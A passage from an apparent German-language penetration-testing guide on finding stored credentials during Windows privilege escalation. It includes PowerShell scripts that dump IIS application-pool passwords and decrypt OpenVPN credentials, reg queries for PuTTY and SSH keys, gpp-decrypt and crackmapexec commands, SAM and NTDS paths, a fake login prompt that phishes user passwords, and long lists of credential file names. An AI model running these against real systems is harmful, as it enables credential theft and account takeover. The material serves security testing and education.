**Beachten Sie, dass Sie Administrator sein und mit einem hohen Integritätslevel arbeiten müssen, um Passwörter aus AppCmd.exe wiederherzustellen.**\
**AppCmd.exe** befindet sich im Verzeichnis `%systemroot%\system32\inetsrv\`.\
Wenn diese Datei vorhanden ist, wurden möglicherweise einige **Zugangsdaten** konfiguriert, die **wiederhergestellt** werden können.

Dieser Code wurde aus [**PowerUP**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) extrahiert:

```bash
function Get-ApplicationHost {
    $OrigError = $ErrorActionPreference
    $ErrorActionPreference = "SilentlyContinue"

    # Check if appcmd.exe exists
    if (Test-Path  ("$Env:SystemRoot\System32\inetsrv\appcmd.exe")) {
        # Create data table to house results
        $DataTable = New-Object System.Data.DataTable

        # Create and name columns in the data table
        $Null = $DataTable.Columns.Add("user")
        $Null = $DataTable.Columns.Add("pass")
        $Null = $DataTable.Columns.Add("type")
        $Null = $DataTable.Columns.Add("vdir")
        $Null = $DataTable.Columns.Add("apppool")

        # Get list of application pools
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppools /text:name" | ForEach-Object {

            # Get application pool name
            $PoolName = $_

            # Get username
            $PoolUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.username"
            $PoolUser = Invoke-Expression $PoolUserCmd

            # Get password
            $PoolPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list apppool " + "`"$PoolName`" /text:processmodel.password"
            $PoolPassword = Invoke-Expression $PoolPasswordCmd

            # Check if credentials exists
            if (($PoolPassword -ne "") -and ($PoolPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($PoolUser, $PoolPassword,'Application Pool','NA',$PoolName)
            }
        }

        # Get list of virtual directories
        Invoke-Expression "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir /text:vdir.name" | ForEach-Object {

            # Get Virtual Directory Name
            $VdirName = $_

            # Get username
            $VdirUserCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:userName"
            $VdirUser = Invoke-Expression $VdirUserCmd

            # Get password
            $VdirPasswordCmd = "$Env:SystemRoot\System32\inetsrv\appcmd.exe list vdir " + "`"$VdirName`" /text:password"
            $VdirPassword = Invoke-Expression $VdirPasswordCmd

            # Check if credentials exists
            if (($VdirPassword -ne "") -and ($VdirPassword -isnot [system.array])) {
                # Add credentials to database
                $Null = $DataTable.Rows.Add($VdirUser, $VdirPassword,'Virtual Directory',$VdirName,'NA')
            }
        }

        # Check if any passwords were found
        if( $DataTable.rows.Count -gt 0 ) {
            # Display results in list view that can feed into the pipeline
            $DataTable |  Sort-Object type,user,pass,vdir,apppool | Select-Object user,pass,type,vdir,apppool -Unique
        }
        else {
            # Status user
            Write-Verbose 'No application pool or virtual directory passwords were found.'
            $False
        }
    }
    else {
        Write-Verbose 'Appcmd.exe does not exist in the default location.'
        $False
    }
    $ErrorActionPreference = $OrigError
}
```

### SCClient / SCCM

Prüfen Sie, ob `C:\Windows\CCM\SCClient.exe` vorhanden ist .\
Installationsprogramme werden mit **SYSTEM-Berechtigungen ausgeführt**, viele sind anfällig für **DLL Sideloading (Info von** [**https://github.com/enjoiz/Privesc**](https://github.com/enjoiz/Privesc)**).**

```bash
$result = Get-WmiObject -Namespace "root\ccm\clientSDK" -Class CCM_Application -Property * | select Name,SoftwareVersion
if ($result) { $result }
else { Write "Not Installed." }
```

## Dateien und Registry (Anmeldedaten)

### Registry-Artefakte für Anmeldedaten von Support-Tools

Einige ältere Remote-Support-Installationen behalten Wertnamen mit Passwortbezug unter festen Registry-Schlüsseln der Anwendung. Bei TeamViewer kennzeichnete beispielsweise `SecurityPasswordAES` in Versionen vor 9 ein konfiguriertes statisches Sitzungspasswort, wie in der [Erklärung des Herstellers zu Registry-Schlüsseln](https://community.teamviewer.com/English/discussion/82264/specification-on-cve-2019-18988) beschrieben. Ein Wertnamen-Marker ist lediglich ein Hinweis für eine Prüfung: Verifizieren Sie die installierte Version, lesbare Wertdaten, das Format und das aktuelle Authentifizierungsverhalten, bevor Sie diese Zugangsdaten bewerten. Der Wechsel von einem Remote-Support-Passwort zu einem privilegierteren Windows-Konto setzt außerdem voraus, dass das Passwort tatsächlich wiederverwendet wird und Sie zur Nutzung dieses Kontos berechtigt sind. Geben Sie Chiffretexte und wiederhergestellte Passwörter nicht in routinemäßigen Aufzählungsausgaben aus.

### Freigegebene Tabellen mit geschützten Arbeitsblättern

Wenn der Verdacht besteht, dass eine lesbare freigegebene Arbeitsmappe Kontodaten enthält, unterscheiden Sie zwischen **Dateiverschlüsselung** und Arbeitsblattschutz oder ausgeblendeten Spalten. [Microsoft weist darauf hin](https://support.microsoft.com/en-us/excel/protection-and-security-in-excel), dass der Arbeitsblattschutz die Bearbeitung einschränkt und keine Sicherheitsfunktion ist; er belegt für sich genommen nicht, dass die Inhalte der Arbeitsmappe verschlüsselt sind. Prüfen Sie nur autorisierte, relevante Dateien und geben Sie bei umfassenden Aufzählungen keine möglichen Geheimnisse aus. Ein lesbarer `.xlsx`-Pfad, ein geschütztes Arbeitsblatt oder eine ausgeblendete Spalte allein beweist weder, dass Zugangsdaten vorhanden sind, noch, dass ein Konto höhere Berechtigungen hat; überprüfen Sie die tatsächlichen Daten und aktuellen Kontoberechtigungen separat.

### Von CI-Servern aufbewahrte Änderungspatches

Ein CI-Server kann eingereichte Quellcodeänderungen nach Abschluss des Builds weiterhin in seinem Datenverzeichnis speichern. [TeamCity dokumentiert](https://www.jetbrains.com/help/teamcity/teamcity-data-directory.html) `system/changes` als Speicherort für Änderungen aus Remote-Runs; das Datenverzeichnis kann konfiguriert sein und muss sich nicht unter `ProgramData` befinden. Ein lesbarer Patch kann Verweise auf eine Datei mit Zugangsdaten, einen Verschlüsselungsschlüssel oder ein Skript, das beides verwendet, enthalten, selbst wenn diese Verweise entfernt oder hinzugefügt wurden. Ein PowerShell-Workflow mit `ConvertTo-SecureString -Key` benötigt beispielsweise sowohl den AES-Schlüssel als auch die verschlüsselte Zeichenfolge; [Microsoft dokumentiert](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/convertfrom-securestring), dass der Schlüssel separat angegeben wird. Prüfen Sie zunächst nur die Namen zugänglicher Patches und untersuchen Sie dann relevante Inhalte mit entsprechender Autorisierung, ohne Geheimnisse in routinemäßigen Aufzählungsausgaben auszugeben. Ein Patch-Pfad, ein verschlüsselter Wert oder ein Schlüsselverweis allein beweist weder gültige Zugangsdaten noch Zugriff mit höheren Berechtigungen. Beschränken Sie die ACLs des Datenverzeichnisses und vermeiden Sie es, Geheimnisse in Build-Änderungen aufzunehmen.

### Benutzerdefinierte Rotation lokaler Administratorkennwörter

Ein selbst entwickeltes Tool zur Kennwortrotation kann ein verschlüsseltes Kennwort eines lokalen Administrators in einem lokalen Dienst speichern und gleichzeitig die Zugangsdaten zum Datenspeicher in einer lesbaren `.env`-Datei oder neben der Updater-Binärdatei ablegen. Prüfen Sie gemeinsam die geplante Aufgabe des Updaters, das Konto, die ACLs der Konfiguration, den Listener und die Berechtigungen des Datenspeichers. Ein nur an Loopback gebundener Datenspeicher ist für einen lokalen Benutzer mit gültigen Zugangsdaten dennoch erreichbar; die Authentifizierung allein beweist jedoch nicht, dass dieser Benutzer die relevanten Datensätze lesen darf. Wenn das Verschlüsselungs-Seed oder Schlüsselmaterial neben dem Chiffretext zugänglich ist, überprüfen Sie die genaue Schlüsselableitung, bevor Sie der Verschlüsselung vertrauen. Ein Verfahren, das deterministisch einen AES-Schlüssel aus einem offengelegten Seed mithilfe von Go-`[`math/rand`](https://pkg.go.dev/math/rand)` ableitet, eignet sich nicht zum Schutz dieses Kennworts; Go weist darauf hin, dass dieses Paket für sicherheitskritische Zufallswerte ungeeignet ist. Vergewissern Sie sich, dass jedes wiederhergestellte Kennwort aktuell ist und zu einem Konto in der lokalen Gruppe „Administrators“ gehört, bevor Sie es als möglichen Privilegienausweitungsweg betrachten. Eine geplante Aufgabe, ein `.env`-Pfad oder ein verschlüsselter Datenblock allein belegt keine dieser Bedingungen. Geben Sie Kennwörter und Schlüsselmaterial nicht in routinemäßigen Aufzählungsausgaben aus.

Verwenden Sie [Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-concepts-overview) für verwaltete Kennwörter lokaler Administratoren. Die speicher- und zugriffskontrollierten Ablagen in Verzeichnisdiensten oder Entra unterscheiden sich von einem benutzerdefinierten lokalen Datenspeicher; auch [Elasticsearch-Rollen](https://www.elastic.co/guide/en/elasticsearch/reference/current/authorization.html/) bestimmen, ob ein authentifizierter Datenspeicherbenutzer einen bestimmten Index lesen kann.

### Java-Server-Pluginarchive und Wiederverwendung von Zugangsdaten

Einige Java-Server-Plugins werden als JAR-Archive im Verzeichnis `plugins` eines Servers bereitgestellt. Ein lesbares benutzerdefiniertes Plugin kann Konfigurationen oder Bytecode mit eingebetteten Dienstzugangsdaten enthalten. Prüfen Sie das Archiv nur mit entsprechender Autorisierung und geben Sie wiederhergestellte Geheimnisse nicht in routinemäßigen Aufzählungsausgaben aus. Ein Plugin-Pfad allein beweist nicht, dass ein Geheimnis vorhanden ist; ein wiederhergestelltes Dienstkennwort führt nur dann zu höheren Berechtigungen, wenn es auch für ein privilegierteres Konto gültig ist. Prüfen Sie die relevanten Datei-ACLs und ersetzen Sie wiederverwendete Zugangsdaten durch separate Geheimnisse. Weitere Informationen zum Verzeichnisaufbau finden Sie in der [Installationsanleitung für Plugins von PaperMC](https://docs.papermc.io/paper/adding-plugins/) und zu Archivinhalten in der [JAR-Dokumentation von Oracle](https://docs.oracle.com/javase/8/docs/technotes/guides/jar/index.html).

### Zugangsdaten der eingebetteten Openfire-Datenbank

Eine Openfire-Installation mit eingebetteter Datenbank kann `openfire.script` unter `Openfire\embedded-db` speichern. Wenn das aktuelle Konto die Datei lesen kann, prüfen Sie gemeinsam die `OFUSER`-Datensätze und die Eigenschaft `passwordKey`. Laut der [Dokumentation zum Benutzeranbieter von Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) können Kennwörter im Klartext oder verschlüsselt mit einem in dieser Eigenschaft gespeicherten Schlüssel abgelegt werden. Ein wiederhergestelltes Kennwort ist für eine Privilegienausweitung nur relevant, wenn es für eine privilegiertere Identität noch gültig ist; der Dateiname allein belegt weder Lesezugriff noch die Wiederverwendung von Zugangsdaten. Der Pfad ist ein Hinweis für die Bestandsaufnahme. Geben Sie Datenbankinhalte und Zugangsdaten nicht in routinemäßigen Aufzählungsausgaben aus.

Die separate Datei `Openfire\conf\openfire.xml` kann die konfigurierten Ports und die Bind-Schnittstelle der Administrationskonsole offenlegen, selbst wenn eine externe Datenbank verwendet wird. Openfire bindet seine Administrationskonsole häufig an Loopback; ein lokales Konto kann die Adresse dennoch erreichen, wenn der Listener läuft. Prüfen Sie gemeinsam den tatsächlichen Listener, die autorisierte Administratorrolle, die Richtlinie für Plugin-Uploads und die Identität des Openfire-Dienstes. Ein Administrator, der ein Plugin installieren kann, kann dafür sorgen, dass Plugin-Code im Kontext des Dienstes ausgeführt wird. Das kann weitreichende Berechtigungen bedeuten, wenn der Dienst als LocalSystem läuft. Ein passendes Kontokennwort oder ein lesbarer Konfigurationspfad allein beweist weder Zugriff auf die Administrationskonsole noch Codeausführung. Siehe die [Installations- und Plugin-Verwaltungsanleitung des Herstellers](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) und die [API-Eigenschaft für Plugin-Uploads](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Konfiguration des forensischen Verwaltungsservers

Velociraptor-Serverkonfigurationen mit dem üblichen Dateinamen `server.config.yaml` können `CA.private_key` der internen CA enthalten. Wenn ein Benutzer mit niedrigeren Berechtigungen diesen Schlüssel lesen kann, kann er möglicherweise ein API-Clientzertifikat ausstellen. Ob dies zu höheren Berechtigungen führt, hängt von den Benutzerrollen des Servers, der Erreichbarkeit der API und der Identität ab, unter der der Server oder der Ziel-Agent ausgeführt wird. Eine Clientkonfiguration enthält anderes Material; ihr Fund belegt keinen Zugriff auf die Server-CA. Bei manchen Installationen wird der private CA-Schlüssel offline aufbewahrt, sodass auch eine lesbare Serverkonfiguration den Signierschlüssel möglicherweise nicht enthält.

Prüfen Sie auf einem Windows-Server die ACL der **Server**konfiguration im Installationsverzeichnis und sämtlicher geschützter Sicherungskopien. Ein möglicher Speicherort ist `%ProgramFiles%\VelociraptorServer\server.config.yaml`; verwenden Sie den für den Dienst konfigurierten Pfad, falls er davon abweicht. Bestätigen Sie, dass die aktuelle Identität die Datei lesen kann und dass `CA.private_key` tatsächlich vorhanden ist. Geben Sie den privaten Schlüssel nicht in Protokollen oder Aufzählungsausgaben aus. Der `config api_client`-Workflow des Herstellers verwendet den CA-Schlüssel, um ein Clientzertifikat auszustellen; dafür ist jedoch auch eine wirksame serverseitige Rolle erforderlich. Das Erstellen oder Ändern einer solchen Rolle kann Schreibzugriff auf den Datenspeicher oder einen Neustart erfordern. Eine bereits vorhandene privilegierte Serveridentität kann einen Zugangsweg bieten, selbst wenn diese Schreibzugriffe nicht möglich sind. API-Abfragen mit Ausführungsrechten laufen im jeweiligen Server- oder Agentenkontext, der weitreichende Berechtigungen haben kann.

Schützen Sie die Serverkonfiguration und Sicherungskopien mit restriktiven ACLs, bewahren Sie den CA-Signierschlüssel nach Möglichkeit offline auf und beschränken Sie API-Rollen sowie den Zugriff auf Listener. Siehe die [Velociraptor-API-Dokumentation](https://docs.velociraptor.app/docs/server_automation/server_api/) und die [Anleitung zur Sicherheitskonfiguration](https://docs.velociraptor.app/docs/deployment/security/).

### PuTTY-Zugangsdaten

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ist ein separater Sitzungsmanager. Sein nativer verschlüsselter Speicher befindet sich möglicherweise unter `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, während ein exportiertes Sitzungssicherungsabbild `sessions-backup.dat` heißen und an einem anderen Ort gespeichert sein kann. [SolarWinds' Exportanleitung](https://thwack.solarwinds.com/discussion/comment/115591) besagt, dass Exporte passwortverschlüsselt sind und Sitzungen, Schlüssel, Skripte, Tags und Beziehungen enthalten können. Das [Supportforum](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) nennt den nativen Speicherort. Überprüfen Sie zuerst Dateiberechtigungen und Pfade. Das Auffinden einer der beiden Dateien verrät weder das Passwort noch beweist es, dass gespeicherte Zugangsdaten noch gültig sind oder höhere Berechtigungen haben.

### PuTTY-SSH-Hostschlüssel

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### SSH-Schlüssel in der Registry

SSH-Private-Keys können im Registrierungsschlüssel `HKCU\Software\OpenSSH\Agent\Keys` gespeichert sein. Prüfe daher, ob sich dort etwas Interessantes befindet:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Wenn du einen Eintrag in diesem Pfad findest, handelt es sich wahrscheinlich um einen gespeicherten SSH-Schlüssel. Er ist verschlüsselt gespeichert, kann aber einfach mit [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract) entschlüsselt werden.\
Weitere Informationen zu dieser Technik findest du hier: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Wenn der Dienst `ssh-agent` nicht ausgeführt wird und beim Systemstart automatisch gestartet werden soll, führe Folgendes aus:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Es sieht so aus, als wäre diese Technik nicht mehr gültig. Ich habe versucht, SSH-Schlüssel zu erstellen, sie mit `ssh-add` hinzuzufügen und mich per SSH an einem Computer anzumelden. Der Registrierungsschlüssel HKCU\Software\OpenSSH\Agent\Keys ist nicht vorhanden, und procmon hat bei der Authentifizierung mit asymmetrischem Schlüssel keine Verwendung von `dpapi.dll` festgestellt.

### Unbeaufsichtigte Dateien

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Du kannst auch mit **metasploit** nach diesen Dateien suchen: _post/windows/gather/enum_unattend_

Beispielinhalt:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### SAM- und SYSTEM-Backups

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Lesbare Windows-Imaging-Backupdateien (`.wim`) können auch offline gespeicherte `SAM`-, `SECURITY`- und `SYSTEM`-Hives enthalten. Prüfe vorrangig lokal zugängliche Backup- oder Image-Verzeichnisse und untersuche die **Mitgliedsnamen** eines Images, bevor du etwas extrahierst; allein ein `.wim`-Dateiname beweist nicht, dass Hives offengelegt werden, und gängige `install.wim`-, `boot.wim`- und Recovery-Images führen oft auf eine falsche Fährte. Eine SMB-Freigabe ist ein separater Zugriffsweg und sollte nur geprüft werden, wenn diese Freigabe zum Umfang gehört. Siehe Microsofts [Anleitungen zu Windows-Images](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) und [Referenz zu Registry-Hive-Dateien](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Cloud-Anmeldedaten

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Suche nach einer Datei namens **SiteList.xml**

### Zwischengespeichertes GPP-Passwort

Früher war eine Funktion verfügbar, mit der über Group Policy Preferences (GPP) benutzerdefinierte lokale Administratorkonten auf einer Gruppe von Computern bereitgestellt werden konnten. Diese Methode wies jedoch erhebliche Sicherheitsmängel auf. Erstens konnten alle Domänenbenutzer auf die Group Policy Objects (GPOs) zugreifen, die als XML-Dateien in SYSVOL gespeichert waren. Zweitens konnten die Passwörter in diesen GPPs, die mit AES256 und einem öffentlich dokumentierten Standardschlüssel verschlüsselt waren, von jedem authentifizierten Benutzer entschlüsselt werden. Dies stellte ein ernstes Risiko dar, da Benutzer dadurch erhöhte Berechtigungen erlangen konnten.

Um dieses Risiko zu verringern, wurde eine Funktion entwickelt, die nach lokal zwischengespeicherten GPP-Dateien mit einem nicht leeren Feld „cpassword“ sucht. Wird eine solche Datei gefunden, entschlüsselt die Funktion das Passwort und gibt ein benutzerdefiniertes PowerShell-Objekt zurück. Dieses Objekt enthält Details zum GPP und zum Speicherort der Datei und erleichtert so die Erkennung und Behebung dieser Sicherheitslücke.

Suche in `C:\ProgramData\Microsoft\Group Policy\history` oder unter _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (vor Windows Vista)_ nach diesen Dateien:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**So entschlüsselst du das cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Mit crackmapexec die Passwörter erhalten:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Beispiel für web.config mit Zugangsdaten:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Backup-Archive in einem IIS-Webroot

Ein altes ZIP-Backup, das direkt in einem über HTTP bereitgestellten Webroot liegt, kann frühere Konfigurationsdateien und wiederverwendbare Zugangsdaten offenlegen. Prüfe den konfigurierten physischen Pfad der Website und ob das Archiv tatsächlich über HTTP erreichbar ist, bevor du es als Sicherheitsrisiko einstufst. Der Standardpfad `C:\inetpub\wwwroot` ist lediglich ein möglicher Speicherort. Eine schnelle lokale Bestandsaufnahme kann Namen und Größen auflisten, ohne Archive zu öffnen:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Ein Archivname belegt weder, dass es ein Geheimnis enthält, noch, dass wiederhergestellte Zugangsdaten höhere Rechte gewähren.

### OpenVPN-Zugangsdaten

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Protokolle

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Nach Zugangsdaten fragen

Du kannst den Benutzer jederzeit **auffordern, seine Zugangsdaten oder sogar die Zugangsdaten eines anderen Benutzers einzugeben**, wenn du denkst, dass er sie kennen könnte (beachte, dass es wirklich **riskant** ist, den Client direkt nach den **Zugangsdaten** zu fragen):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Mögliche Dateinamen mit Zugangsdaten**

Bekannte Dateien, die früher **Passwörter** im **Klartext** oder als **Base64** enthielten.

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

#### Dateinamenslisten-Variante ohne die Password-Safe-Erweiterung

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Password Safe v3-Datenbanken verwenden häufig die Dateiendung `.psafe3`. Behandle eine Datei mit passendem Namen als möglichen verschlüsselten Tresor. Ihr Vorhandensein belegt nicht, dass du sie lesen oder entsperren kannst oder gespeicherte Zugangsdaten verwenden darfst. Prüfe bei der Überprüfung, wo solche Dateien gespeichert sind, zugängliche Benutzerprofile und konfigurierte Dateifreigabe-Stammverzeichnisse.

Eine lesbare KeePass-`.kdbx`-Datei ist ebenfalls lediglich ein Hinweis auf einen verschlüsselten Tresor. Zum Entsperren werden das tatsächliche Master-Passwort sowie alle konfigurierten Faktoren wie Schlüsseldatei oder Konto benötigt. Falls eine autorisierte Überprüfung in einem Eintrag ein LM:NT-Hash-Paar findet, verifiziere das angegebene Konto und ob der NT-Hash aktuell ist und vom NTLM-Dienst des Ziels akzeptiert wird, bevor du [pass-the-hash](../ntlm/README.md#pass-the-hash) in Betracht ziehst. Ein Tresoreintrag gewährt für sich genommen weder Administrator- noch SYSTEM-Rechte; auch der Remote-Dienstzugriff, die Kontoberechtigungen und jeder separate Schritt zur Dienstausführung müssen gegeben sein. Die Bestandsaufnahme sollte den Tresorpfad und die Lesbarkeit angeben, nicht die Datenbank oder gespeicherte Zugangsdaten ausgeben.

Durchsuche alle vorgeschlagenen Dateien:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

#### Suchbefehlsvariante ohne die Password Safe-Erweiterung

```
cd C:\
